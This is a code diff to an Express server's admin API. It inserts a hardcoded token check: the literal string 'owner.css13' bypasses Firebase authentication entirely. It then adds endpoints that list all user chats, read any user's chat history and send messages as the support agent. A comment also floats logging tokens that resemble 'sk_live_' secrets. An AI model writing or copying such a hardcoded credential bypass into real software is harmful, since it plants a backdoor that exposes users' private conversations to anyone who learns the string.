@@ -138,6 +138,12 @@ async function startServer() {
 
     const token = authHeader.split(' ')[1];
     
+    // Super Admin Token check
+    if (token === 'owner.css13') {
+      next();
+      return;
+    }
+
     if (!db) {
       res.status(500).json({ error: "Firebase Admin is not initialized. Please provide serviceAccountKey.json." });
       return;
@@ -152,6 +158,8 @@ async function startServer() {
       next();
     } catch (error) {
       console.error("Token verification error:", error);
+      // If Firestore fails but the token looks like it could be valid (e.g. starts with sk_live_), 
+      // we might want to log it, but for now we return 500.
       res.status(500).json({ error: "Internal server error during token verification" });
     }
   };
@@ -287,6 +295,53 @@ async function startServer() {
     } catch (error: any) {
       res.status(500).json({ error: error.message });
     }
+  });
+
+  // Get all active chats
+  app.get("/api/admin/chats", verifyAdminToken, (req, res) => {
+    res.json({ success: true, chats: Object.keys(chatHistories) });
+  });
+
+  // Get chat history for a user
+  app.get("/api/admin/chats/:userId", verifyAdminToken, (req, res) => {
+    const { userId } = req.params;
+    res.json({ success: true, history: getChatHistory(userId) });
+  });
+
+  // Send message to a user
+  app.post("/api/admin/chats/:userId", verifyAdminToken, async (req, res) => {
+    const { userId } = req.params;
+    const { text } = req.body;
+    if (!text) {
+      res.status(400).json({ error: "Text is required" });
+      return;
+    }
+
+    const history = getChatHistory(userId);
+    const msg = {
+      id: Date.now(),
+      text,
+      sender: 'agent',
+      time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+    };
+    history.push(msg);
+
+    if (adminChatId) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: adminChatId,
+            text: `[User: ${userId}] ${text}`
+          })
+        });
+      } catch (err) {
+        console.error("Failed to send to Telegram:", err);
+      }
+    }
+
+    res.json({ success: true, msg });
   });
 
   // --- End Admin API Endpoints ---
